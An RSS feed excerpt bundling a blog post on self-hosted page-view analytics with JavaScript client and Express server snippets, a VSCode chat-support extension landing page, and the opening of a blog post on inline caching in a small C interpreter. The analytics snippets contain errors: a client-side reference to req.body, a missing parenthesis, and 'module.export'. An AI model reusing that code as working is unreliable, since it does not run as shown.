<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br></pre></td><td><pre><span></span><br><span></span><br><span><span>const</span> lastViewTime = <span>parseInt</span>(<span>localStorage</span>.getItem(<span>'lastViewTime'</span>)) || <span>0</span>;</span><br><span><span>const</span> viewCount = <span>parseInt</span>(<span>localStorage</span>.getItem(<span>'viewCount'</span>)) || <span>0</span>;</span><br><span><span>const</span> lastViewPage = <span>localStorage</span>.getItem(<span>'lastViewedPage'</span>) || <span>''</span>;</span><br><span></span><br><span><span>localStorage</span>.setItem(<span>'lastViewTime'</span>, <span>Date</span>.now())</span><br><span><span>localStorage</span>.setItem(<span>'viewCount'</span>, viewCount+<span>1</span>)</span><br><span><span>localStorage</span>.setItem(<span>'lastViewedPage'</span>, <span>document</span>.location.href);</span><br><span></span><br><span>fetch(<span>'/api/pageViews'</span>, {</span><br><span>  method: <span>'POST'</span>,</span><br><span>  headers: {</span><br><span>    <span>'Content-Type'</span>: <span>'application/json'</span></span><br><span>  },</span><br><span>  body: <span>JSON</span>.stringify({</span><br><span>    page: <span>document</span>.location.href,</span><br><span>    viewCount,</span><br><span>    time: <span>Date</span>.now(),</span><br><span>    lastViewTime: lastViewTime,</span><br><span>    lastViewPage: lastViewPage,</span><br><span>    userLanguage: navigator.language,</span><br><span>    userAgent: navigator.userAgent,</span><br><span>    referrer: <span>document</span>.referrer,</span><br><span>    dayTime: <span>parseInt</span>(req.body.dayTime+<span>''</span>),</span><br><span>  })</span><br><span>})  </span><br><span>  .then( <span><span>r</span> =&gt;</span> r.json())</span><br><span>  .then(<span><span>data</span> =&gt;</span> <span>console</span>.log(<span>'pageViewResult:'</span>, data);</span><br><span></span><br></pre></td></tr></tbody></table></figure>
<p>On the server I just dump this information into a jsonl file, meaning one json log entry each line. It can easily be converted to csv for analyses via <code>excel</code>. Draw some charts or count per interval weekly and monthly interval. </p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br></pre></td><td><pre><span><span>const</span> router = <span>require</span>(<span>'express'</span>).Router();</span><br><span><span>module</span>.export.pageViewRouter = router;</span><br><span></span><br><span><span>const</span> file = fs.createWriteStream(fileName, {</span><br><span>  flags: <span>'a'</span> </span><br><span>});</span><br><span></span><br><span>router.post(<span>'/api/pageViews'</span>,<span>async</span> (req,res) =&gt; {</span><br><span>  res.json(<span>true</span>);</span><br><span>  file.write(<span>JSON</span>.stringify({</span><br><span>    page: body.page,</span><br><span>    time: <span>Date</span>.now(),</span><br><span>    userLanguage: (req.body.userLanguage+<span>''</span>).substr(<span>0</span>,<span>500</span>),</span><br><span>    userAgent: userAgent.id,</span><br><span>    viewCount: <span>parseInt</span>(req.body.viewCount),</span><br><span>    lastViewTime: <span>parseInt</span>(req.body.lastViewTime+<span>''</span>),</span><br><span>    lastViewPage: req.body.lastViewPage,</span><br><span>    referrer: req.body.referrer,</span><br><span>    dayTime: <span>new</span> <span>Date</span>().getHours()</span><br><span>  })+<span>'\n'</span>, <span>(<span>err</span>)=&gt;</span>{</span><br><span>    <span>if</span>(err) <span>console</span>.log(err)</span><br><span>  });</span><br><span>});</span><br></pre></td></tr></tbody></table></figure>

<p>Do you see, that I do not check if the browser supports the <code>fetch</code> API and modern arrow functions? I was thinking about it, and decided that I don’t need to care about old browser compatibility for this optional feature.</p>
<p>You see all the fields that are getting stored. These are what I came up with. That I think are interesting. To be honest, the API shown is not exactly the one running at tnickel.de, but the concept is this. On my running implementation I validate the received data, store urls and user agent string into a separate <a href="http://tnickel.de/2020/11/20/2020-11-rapid-prototyping-with-json-file-database/">json file database</a> and write the id into the log file. But with this example you can understand how you can implement the server side yourself.</p>
<p>As by chance: The dev.to community, was just asked about analytics tools. And I described my little solution. The <a target="_blank" rel="noopener" href="https://dev.to/madza/what-web-analytics-tools-do-you-use-458o">comment</a> received a reply by <a target="_blank" rel="noopener" href="https://charanj.it/">Charanjit Chana</a>, saying he is using a similar solution, here is what I found on his websites source code (it was minified, so I formatted it a little):</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br></pre></td><td><pre><span><span><span>function</span> <span>allowedToTrack</span>(<span></span>) </span>{</span><br><span>  <span>return</span> !(<span>window</span>.doNotTrack || navigator.doNotTrack || navigator.msDoNotTrack || <span>window</span>.external &amp;&amp; <span>"msTrackingProtectionEnabled"</span> <span>in</span> <span>window</span>.external) || <span>"1"</span> != <span>window</span>.doNotTrack &amp;&amp; <span>"yes"</span> != navigator.doNotTrack &amp;&amp; <span>"1"</span> != navigator.doNotTrack &amp;&amp; <span>"1"</span> != navigator.msDoNotTrack &amp;&amp; !<span>window</span>.external.msTrackingProtectionEnabled()</span><br><span>}</span><br><span><span>if</span> (allowedToTrack()) {</span><br><span>  <span>let</span> o = <span>Math</span>.floor(<span>8999999</span> * <span>Math</span>.random()) + <span>1e6</span>;</span><br><span>  <span>let</span> n = <span>window</span>.innerHeight + <span>"x"</span> + <span>window</span>.innerWidth; </span><br><span>  </span><br><span>  fetch(<span>"https://123.charanj.it/xyz/api/"</span> + o + <span>"/false/"</span> + n);</span><br><span>}</span><br><span></span><br><span><span>if</span> (<span>void</span> <span>0</span> !== <span>console</span>) {</span><br><span>  <span>console</span>.log(<span>"%c👋 Hey!"</span>, <span>"font-size: 16px; font-weight: 600"</span>);</span><br><span>  <span>console</span>.log(<span>"%cIf you can see this I would love to hear from you."</span>, <span>"font-size: 16px;"</span>);</span><br><span>  <span>console</span>.log(<span>"%cYou can find me at https://twitter.com/cchana."</span>, <span>"font-size: 16px;"</span>);</span><br><span>  <span>console</span>.log(<span>"%cUse the hashtag #cchanaconsole"</span>, <span>"font-size: 16px;"</span>);</span><br><span>  <span>console</span>.log(<span>"%c🤙 🖖"</span>, <span>"font-size: 16px;"</span>);</span><br><span>}</span><br></pre></td></tr></tbody></table></figure>
<p>Seems as head of development he is interested in finding new developer talents for his team. I like the <code>allowToTrack</code> function used before the analytics request is made. This request then set a cookie, so multiple page views can be related to the same user and session. I don’t know about the rules in England after it left the EU, but I believe in Germany, an additional popup banner would be needed. Other than me, Charanjit is interested in the users screen resolution to know what to optimize the page for.</p>
<p>You now have seen two valid approaches to building the client side for collecting analytics information. With this article, I hope you find how how this website does analytics, without tracing the users all over the internet and even into their darkest dreams.</p>
  
	</div>
		

   	       
	</article>
	
<nav>
  
  
  
  
  
  
</nav>

	



</div></div>]]>
            </description>
            <link>http://tnickel.de/2020/12/24/2020-12-How-I-replaced-google-analytics-on-my-website/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25773775</guid>
            <pubDate>Thu, 14 Jan 2021 08:41:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Developers Experts Chat on VScode]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25773743">thread link</a>) | @atoz2020
<br/>
January 14, 2021 | https://xscode.com/vscode-extension/ | <a href="https://web.archive.org/web/*/https://xscode.com/vscode-extension/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-elementor-type="wp-page" data-elementor-id="1613" data-elementor-settings="[]"><div><div><section data-id="b2399c6" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}"><div><div><div data-id="592ffd41" data-element_type="column"><div><div><div data-id="adaf7e7" data-element_type="widget" data-widget_type="text-editor.default"><div><p>Get instant chat support from the world’s best open source developers, while Coding in VSCode.</p></div></div><section data-id="1448af4" data-element_type="section"></section></div></div></div></div></div></section><section data-id="b246335" data-element_type="section"><div><div><div data-id="fe0fedc" data-element_type="column"><div><div><div data-id="3423e03" data-element_type="widget" data-widget_type="html.default"><p><a href="https://www.producthunt.com/posts/xs-code-aces-for-vscode?utm_source=badge-featured&amp;utm_medium=badge&amp;utm_souce=badge-xs-code-aces-for-vscode" target="_blank"><img src="https://api.producthunt.com/widgets/embed-image/v1/featured.svg?post_id=280111&amp;theme=light" alt="xs:code Aces for VSCode - Instant chat support from ace developers directly in VSCode | Product Hunt" width="250" height="54" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20250%2054'%3E%3C/svg%3E"></a></p></div><div data-id="d38f353" data-element_type="widget" data-widget_type="heading.default"><p><h2>Solve coding problems - while coding</h2></p></div><div data-id="660206e" data-element_type="widget" data-widget_type="text-editor.default"><div><div><p><span>Connect with over 850,000 Ace developers, who create and maintain the world’s top open source projects.&nbsp;</span><span>An expert’s advice on any language, framework or development issue, is a click away, right inside VSCode.</span></p></div></div></div></div></div></div><div data-id="7a5a986" data-element_type="column"><div><div><div data-id="50f4800" data-element_type="widget" data-widget_type="image.default"><div><p><img width="1200" height="1000" src="https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section2-2.png" alt="" srcset="https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section2-2.png 1200w, https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section2-2-300x250.png 300w, https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section2-2-1024x853.png 1024w, https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section2-2-768x640.png 768w" sizes="100vw" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201200%201000'%3E%3C/svg%3E" data-lazy-srcset="https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section2-2.png 1200w, https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section2-2-300x250.png 300w, https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section2-2-1024x853.png 1024w, https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section2-2-768x640.png 768w" data-lazy-src="https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section2-2.png"></p></div></div></div></div></div></div></div></section><section data-id="f66f4e0" data-element_type="section"><div><div><div data-id="1202725" data-element_type="column"><div><div><div data-id="cd08c8b" data-element_type="widget" data-widget_type="text-editor.default"><div><div><p>xs:code Aces for VSCode connects you with Ace open source developers who are ready to provide paid support for any coding issue. Start a chat, explain your problem, and get an offer. Offers start at $5.</p><p>Paid support is available at the discretion and responsibility of the developers offering it.</p></div></div></div><div data-id="a2b8c67" data-element_type="widget" data-widget_type="image.default"><div><p><img width="720" height="405" src="https://blog.xscode.com/wp-content/uploads/2021/01/aces-gif-full.gif" alt="" sizes="100vw" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20720%20405'%3E%3C/svg%3E"></p></div></div></div></div></div></div></div></section><section data-id="b6e5012" data-element_type="section"><div><div><div data-id="a412587" data-element_type="column"><div><div><div data-id="ae54b7c" data-element_type="widget" data-widget_type="image.default"><div><p><img width="1200" height="1000" src="https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section3-2.png" alt="" srcset="https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section3-2.png 1200w, https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section3-2-300x250.png 300w, https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section3-2-1024x853.png 1024w, https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section3-2-768x640.png 768w" sizes="100vw" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201200%201000'%3E%3C/svg%3E" data-lazy-srcset="https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section3-2.png 1200w, https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section3-2-300x250.png 300w, https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section3-2-1024x853.png 1024w, https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section3-2-768x640.png 768w" data-lazy-src="https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section3-2.png"></p></div></div></div></div></div><div data-id="caa5f78" data-element_type="column"><div><div><div data-id="76f0114" data-element_type="widget" data-widget_type="text-editor.default"><div><p>Open source Developers on xs:code (Aces) are ranked using an algorithm that takes into account multiple factors, but gives significant weight to their contributions to open source repositories. Our matching algorithm provides the developers best equipped to help on any topic or open source repository.</p></div></div></div></div></div></div></div></section><section data-id="165d4b9" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}"><div><div><div data-id="f109437" data-element_type="column"><div><div><div data-id="dd220c9" data-element_type="widget" data-widget_type="image.default"><div><p><img width="300" height="400" src="https://blog.xscode.com/wp-content/uploads/2020/11/rocket.png" alt="" srcset="https://blog.xscode.com/wp-content/uploads/2020/11/rocket.png 300w, https://blog.xscode.com/wp-content/uploads/2020/11/rocket-225x300.png 225w" sizes="100vw" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20400'%3E%3C/svg%3E" data-lazy-srcset="https://blog.xscode.com/wp-content/uploads/2020/11/rocket.png 300w, https://blog.xscode.com/wp-content/uploads/2020/11/rocket-225x300.png 225w" data-lazy-src="https://blog.xscode.com/wp-content/uploads/2020/11/rocket.png"></p></div></div><div data-id="8d70bd6" data-element_type="widget" data-widget_type="text-editor.default"><div><p>Install the extension directly on VSCode or from the VSCode marketplace.</p></div></div></div></div></div></div></div></section><section data-id="b5b036b" data-element_type="section"><div><div><div data-id="e2ab2cd" data-element_type="column"><div><div><div data-id="a1c0f21" data-element_type="widget" data-widget_type="text-editor.default"><div><p>Extend any developer-oriented product with xs:code Aces. Use the free xs:code SDK to add instant chat support to your App, platform or VSCode extension – and start earning additional revenue with our revenue-share partner program.</p></div></div></div></div></div><div data-id="382a9df" data-element_type="column"><div><div><div data-id="2530cce" data-element_type="widget" data-widget_type="image.default"><div><p><img width="1200" height="1000" src="https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section1-2.png" alt="" srcset="https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section1-2.png 1200w, https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section1-2-300x250.png 300w, https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section1-2-1024x853.png 1024w, https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section1-2-768x640.png 768w" sizes="100vw" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201200%201000'%3E%3C/svg%3E" data-lazy-srcset="https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section1-2.png 1200w, https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section1-2-300x250.png 300w, https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section1-2-1024x853.png 1024w, https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section1-2-768x640.png 768w" data-lazy-src="https://blog.xscode.com/wp-content/uploads/2020/11/new-images-section1-2.png"></p></div></div></div></div></div></div></div></section></div></div></div></div>]]>
            </description>
            <link>https://xscode.com/vscode-extension/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25773743</guid>
            <pubDate>Thu, 14 Jan 2021 08:36:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Inline Caching]]>
            </title>
            <description>
<![CDATA[
Score 36 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25773724">thread link</a>) | @todsacerdoti
<br/>
January 14, 2021 | https://bernsteinbear.com/blog/inline-caching/ | <a href="https://web.archive.org/web/*/https://bernsteinbear.com/blog/inline-caching/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>Inline caching is a popular technique for runtime optimization. It was first
introduced in 1984 in Deutsch &amp; Schiffman’s paper <a href="http://web.cs.ucla.edu/~palsberg/course/cs232/papers/DeutschSchiffman-popl84.pdf">Efficient implementation
of the smalltalk-80 system [PDF]</a> but has had a long-lasting legacy in
today’s dynamic language implementations. Runtimes like the Hotspot JVM, V8,
and SpiderMonkey use it to improve the performance of code written for those
virtual machines.</p>

<p>In this blog post, I will attempt to distill the essence of inline caching
using a small and relatively useless bytecode interpreter built solely for this
blog post. The caching strategy in this demo is a technique similar to the
ideas from <a href="http://www.complang.tuwien.ac.at/kps09/pdfs/brunthaler.pdf">Inline Caching meets Quickening [PDF]</a> in that it
caches function pointers instead of making use of a JIT compiler.</p>

<h2 id="background">Background</h2>

<p>In many compiled programming languages like C and C++, types and attribute
locations are known at compile time. This makes code like the following fast:</p>

<div><div><pre><code><span>#include "foo.h"
</span>
<span>Foo</span> <span>do_add</span><span>(</span><span>Foo</span> <span>left</span><span>,</span> <span>Foo</span> <span>right</span><span>)</span> <span>{</span>
  <span>return</span> <span>left</span><span>.</span><span>add</span><span>(</span><span>right</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>The compiler knows precisely what type <code>left</code> and <code>right</code> are (it’s <code>Foo</code>) and
also where the method <code>add</code> is in the executable. If the implementation is in
the header file, it may even be inlined and <code>do_add</code> may be optimized to a
single instruction. Check out the assembly from <code>objdump</code>:</p>

<div><div><pre><code>0000000000401160 &lt;_Z6do_add3FooS_&gt;:
  401160:	48 83 ec 18          	sub    $0x18,%rsp
  401164:	89 7c 24 0c          	mov    %edi,0xc(%rsp)
  401168:	48 8d 7c 24 0c       	lea    0xc(%rsp),%rdi
  40116d:	e8 0e 00 00 00       	callq  401180 &lt;_ZN3Foo3addES_&gt;
  401172:	48 83 c4 18          	add    $0x18,%rsp
  401176:	c3                   	retq   
</code></pre></div></div>

<p>All it does is save the parameters to the stack, call <code>Foo::add</code>, and then
restore the stack.</p>

<p>In more dynamic programming languages, it is often impossible to determine at
runtime startup what type any given variable binding has. We’ll use Python as an
example to illustrate how dynamism makes this tricky, but this constraint is
broadly applicable to Ruby, JavaScript, etc.</p>

<p>Consider the following Python snippet:</p>

<div><div><pre><code><span>def</span> <span>do_add</span><span>(</span><span>left</span><span>,</span> <span>right</span><span>):</span>
    <span>return</span> <span>left</span><span>.</span><span>add</span><span>(</span><span>right</span><span>)</span>
</code></pre></div></div>

<p>Due to Python’s various dynamic features, the compiler cannot in general know
what type <code>value</code> is and therefore what code to run when reading <code>left.add</code>.
This program will be compiled down to a couple Python bytecode instructions
that do a very generic <code>LOAD_METHOD</code>/<code>CALL_METHOD</code> operation:</p>

<div><div><pre><code>&gt;&gt;&gt; import dis
&gt;&gt;&gt; dis.dis("""
... def do_add(left, right):
...     return left.add(right)
... """)
[snip]
Disassembly of &lt;code object do_add at 0x7f0b40cf49d0, file "&lt;dis&gt;", line 2&gt;:
  3           0 LOAD_FAST                0 (left)
              2 LOAD_METHOD              0 (add)
              4 LOAD_FAST                1 (right)
              6 CALL_METHOD              1
              8 RETURN_VALUE

&gt;&gt;&gt; 
</code></pre></div></div>

<p>This <code>LOAD_METHOD</code> Python bytecode instruction is unlike the x86 <code>mov</code>
instruction in that <code>LOAD_METHOD</code> is not given an offset into <code>left</code>, but
instead is given the name <code>"add"</code>. It has to go and figure out how to read
<code>add</code> from <code>left</code>’s type — which could change from call to call.</p>

<p>In fact, even if the parameters were typed (which is a new feature in Python
3), the same code would be generated. Writing <code>left: Foo</code> means that <code>left</code> is a
<code>Foo</code> <em>or</em> a subclass.</p>

<p>This is not a simple process like “fetch the attribute at the given offset
specified by the type”. The runtime has to find out what kind of object <code>add</code>
is. Maybe it’s just a function, or maybe it’s a <code>property</code>, or maybe it’s some
custom descriptor protocol thing. There’s no way to just turn this into a
<code>mov</code>!</p>

<p>… or is there?</p>

<h2 id="runtime-type-information">Runtime type information</h2>

<p>Though dynamic runtimes do not know ahead of time what types variables have at
any given opcode, they do eventually find out <em>when the code is run</em>. The first
time someone calls <code>do_add</code>, <code>LOAD_METHOD</code> will go and look up the type of
<code>left</code>. It will use it to look up the attribute <code>add</code> and then throw the type
information away. But the second time someone calls <code>do_add</code>, the same thing
will happen. Why don’t runtimes store this information about the type and the
method and save the lookup work?</p>

<p>The thinking is “well, <code>left</code> could be any type of object — best not make any
assumptions about it.” While this is <em>technically</em> true, Deutsch &amp;
Schiffman find that “at a given point in code, the receiver is often the same
class as the receiver at the same point when the code was last executed”.</p>

<blockquote>
  <p><strong>Note:</strong> By <em>receiver</em>, they mean the thing from which the attribute is
being loaded. This is some Object-Oriented Programming terminology.</p>
</blockquote>

<p>This is huge. This means that, even in this sea of dynamic behavior, humans
actually are not all that creative and tend to write functions that see only a
handful of types at a given location.</p>

<p>The Smalltalk-80 paper describes a runtime that takes advantage of this by
adding “inline caches” to functions. These inline caches keep track of variable
types seen at each point in the code, so that the runtime can make optimization
decisions with that information.</p>

<p>Let’s take a look at how this could work in practice.</p>

<h2 id="a-small-example">A small example</h2>

<p>I put together a <a href="https://github.com/tekknolagi/icdemo">small stack machine</a> with only a few operations. There
are very minimal features to avoid distracting from the main focus: inline
caching. Extending this example would be an excellent exercise.</p>

<h3 id="objects-and-types">Objects and types</h3>

<p>The design of this runtime involves two types of objects (<code>int</code>s and <code>str</code>s).
Objects are implemented as a tagged union, but for the purposes of this blog
post the representation does not matter very much.</p>

<div><div><pre><code><span>typedef</span> <span>enum</span> <span>{</span>
  <span>kInt</span><span>,</span>
  <span>kStr</span><span>,</span>
<span>}</span> <span>ObjectType</span><span>;</span>

<span>typedef</span> <span>struct</span> <span>{</span>
  <span>ObjectType</span> <span>type</span><span>;</span>
  <span>union</span> <span>{</span>
    <span>const</span> <span>char</span> <span>*</span><span>str_value</span><span>;</span>
    <span>int</span> <span>int_value</span><span>;</span>
  <span>};</span>
<span>}</span> <span>Object</span><span>;</span>
</code></pre></div></div>

<p>These types have methods on them, such as <code>add</code> and <code>print</code>. Method names are
represented with an enum (<code>Symbol</code>) though strings would work just as well.</p>

<div><div><pre><code><span>typedef</span> <span>enum</span> <span>{</span>
  <span>kAdd</span><span>,</span>
  <span>kPrint</span><span>,</span>

  <span>kUnknownSymbol</span> <span>=</span> <span>kPrint</span> <span>+</span> <span>1</span><span>,</span>
<span>}</span> <span>Symbol</span><span>;</span>
</code></pre></div></div>

<p>The representation of type information isn’t super important. Just know that
there is a function called <code>lookup_method</code> and that it is very slow. Eventually
we’ll want to cache its result.</p>

<div><div><pre><code><span>Method</span> <span>lookup_method</span><span>(</span><span>ObjectType</span> <span>type</span><span>,</span> <span>Symbol</span> <span>name</span><span>);</span>
</code></pre></div></div>

<p>Let’s see how we use these <code>lookup_method</code> in the interpreter.</p>

<h3 id="interpreter">Interpreter</h3>

<p>There’s no way to call these methods directly. For the purposes of this demo,
the only way to call these methods is through purpose-built opcodes. For
example, the opcode <code>ADD</code> takes two arguments. It looks up <code>kAdd</code> on the left
hand side and calls it. <code>PRINT</code> is similar.</p>

<p>There are only two other opcodes, <code>ARG</code> and <code>HALT</code>.</p>

<div><div><pre><code><span>typedef</span> <span>enum</span> <span>{</span>
  <span>// Load a value from the arguments array at index `arg'.</span>
  <span>ARG</span><span>,</span>
  <span>// Add stack[-2] + stack[-1].</span>
  <span>ADD</span><span>,</span>
  <span>// Pop the top of the stack and print it.</span>
  <span>PRINT</span><span>,</span>
  <span>// Halt the machine.</span>
  <span>HALT</span><span>,</span>
<span>}</span> <span>Opcode</span><span>;</span>
</code></pre></div></div>
<p>Bytecode is represented by a series of opcode/argument pairs, each taking up
one byte. Only <code>ARG</code> needs an argument; the other instructions ignore theirs.</p>

<p>Let’s look at a sample program.</p>

<div><div><pre><code><span>byte</span> <span>bytecode</span><span>[]</span> <span>=</span> <span>{</span><span>/*0:*/</span> <span>ARG</span><span>,</span>   <span>0</span><span>,</span>
                   <span>/*2:*/</span> <span>ARG</span><span>,</span>   <span>1</span><span>,</span>
                   <span>/*4:*/</span> <span>ADD</span><span>,</span>   <span>0</span><span>,</span>
                   <span>/*6:*/</span> <span>PRINT</span><span>,</span> <span>0</span><span>,</span>
                   <span>/*8:*/</span> <span>HALT</span><span>,</span>  <span>0</span><span>};</span>
</code></pre></div></div>

<p>This program takes its two arguments, adds them together, prints the result,
and then halts the interpreter.</p>

<p>You may wonder, “how is it that there is an instruction for loading arguments
but no call instruction?” Well, the interpreter does not support calls. There
is only a top-level function, <code>eval_code</code>. It takes an object, evaluates its
bytecode with the given arguments, and returns. Extending the interpreter to
support function calls would be another good exercise.</p>

<p>The interpreter implementation is a fairly straightforward <code>switch</code> statement.
Notice that it takes a representation of a function-like thing (<code>Code</code>) and an
array of arguments. <code>nargs</code> is only used for bounds checking.</p>

<div><div><pre><code><span>typedef</span> <span>unsigned</span> <span>char</span> <span>byte</span><span>;</span>

<span>typedef</span> <span>struct</span> <span>{</span>
  <span>ObjectType</span> <span>key</span><span>;</span>
  <span>Method</span> <span>value</span><span>;</span>
<span>}</span> <span>CachedValue</span><span>;</span>

<span>typedef</span> <span>struct</span> <span>{</span>
  <span>// Array of `num_opcodes' (op, arg) pairs (total size `num_opcodes' * 2).</span>
  <span>byte</span> <span>*</span><span>bytecode</span><span>;</span>
  <span>int</span> <span>num_opcodes</span><span>;</span>
  <span>// Array of `num_opcodes' elements.</span>
  <span>CachedValue</span> <span>*</span><span>caches</span><span>;</span>
<span>}</span> <span>Code</span><span>;</span>

<span>static</span> <span>unsigned</span> <span>kBytecodeSize</span> <span>=</span> <span>2</span><span>;</span>

<span>void</span> <span>eval_code_uncached</span><span>(</span><span>Code</span> <span>*</span><span>code</span><span>,</span> <span>Object</span> <span>*</span><span>args</span><span>,</span> <span>int</span> <span>nargs</span><span>)</span> <span>{</span>
  <span>int</span> <span>pc</span> <span>=</span> <span>0</span><span>;</span>
<span>#define STACK_SIZE 100
</span>  <span>Object</span> <span>stack_array</span><span>[</span><span>STACK_SIZE</span><span>];</span>
  <span>Object</span> <span>*</span><span>stack</span> <span>=</span> <span>stack_array</span><span>;</span>
<span>#define PUSH(x) *stack++ = (x)
#define POP() *--stack
</span>  <span>while</span> <span>(</span><span>true</span><span>)</span> <span>{</span>
    <span>Opcode</span> <span>op</span> <span>=</span> <span>code</span><span>-&gt;</span><span>bytecode</span><span>[</span><span>pc</span><span>];</span>
    <span>byte</span> <span>arg</span> <span>=</span> <span>code</span><span>-&gt;</span><span>bytecode</span><span>[</span><span>pc</span> <span>+</span> <span>1</span><span>];</span>
    <span>switch</span> <span>(</span><span>op</span><span>)</span> <span>{</span>
      <span>case</span> <span>ARG</span><span>:</span>
        <span>CHECK</span><span>(</span><span>arg</span> <span>&lt;</span> <span>nargs</span> <span>&amp;&amp;</span> <span>"out of bounds arg"</span><span>);</span>
        <span>PUSH</span><span>(</span><span>args</span><span>[</span><span>arg</span><span>]);</span>
        <span>break</span><span>;</span>
      <span>case</span> <span>ADD</span><span>:</span> <span>{</span>
        <span>Object</span> <span>right</span> <span>=</span> <span>POP</span><span>();</span>
        <span>Object</span> <span>left</span> <span>=</span> <span>POP</span><span>();</span>
        <span>Method</span> <span>method</span> <span>=</span> <span>lookup_method</span><span>(</span><span>left</span><span>.</span><span>type</span><span>,</span> <span>kAdd</span><span>);</span>
        <span>Object</span> <span>result</span> <span>=</span> <span>(</span><span>*</span><span>method</span><span>)(</span><span>left</span><span>,</span> <span>right</span><span>);</span>
        <span>PUSH</span><span>(</span><span>result</span><span>);</span>
        <span>break</span><span>;</span>
      <span>}</span>
      <span>case</span> <span>PRINT</span><span>:</span> <span>{</span>
        <span>Object</span> <span>obj</span> <span>=</span> <span>POP</span><span>();</span>
        <span>Method</span> <span>method</span> <span>=</span> <span>lookup_method</span><span>(</span><span>obj</span><span>.</span><span>type</span><span>,</span> <span>kPrint</span><span>);</span>
        <span>(</span><span>*</span><span>method</span><span>)(</span><span>obj</span><span>);</span>
        <span>break</span><span>;</span>
      <span>}</span>
      <span>case</span> <span>HALT</span><span>:</span>
        <span>return</span><span>;</span>
      <span>default:</span>
        <span>fprintf</span><span>(</span><span>stderr</span><span>,</span> <span>"unknown opcode %d</span><span>\n</span><span>"</span><span>,</span> <span>op</span><span>);</span>
        <span>abort</span><span>();</span>
    <span>}</span>
    <span>pc</span> <span>+=</span> <span>kBytecodeSize</span><span>;</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>Both <code>ADD</code> and <code>PRINT</code> make use of <code>lookup_method</code> to find out what function
pointer corresponds to the given <code>(type, symbol)</code> pair. Both opcodes throw away
the result. How sad. Let’s figure out how to save some of that data. Maybe we
can use the <code>caches</code> slot in <code>Code</code>.</p>

<h3 id="inline-caching-strategy">Inline caching strategy</h3>

<p>Since the Smalltalk-80 paper tells us that the receiver type is unlikely to
change from call to call at a given point in the bytecode, let’s cache <em>one</em>
method address per opcode. As with any cache, we’ll have to store both a key
(the object type) and a value (the method address).</p>

<p>There are several states that the cache could be in when entering the an
opcode:</p>

<ol>
  <li><strong>If it is empty</strong>, look up the method and store it in the cache using the
current type as a cache key. Use the cached value.</li>
  <li><strong>If it has an entry and the entry is for the current type</strong>, use the cached
value.</li>
  <li>Last, <strong>if it has an entry and the entry is for a different …</strong></li></ol></div></div>
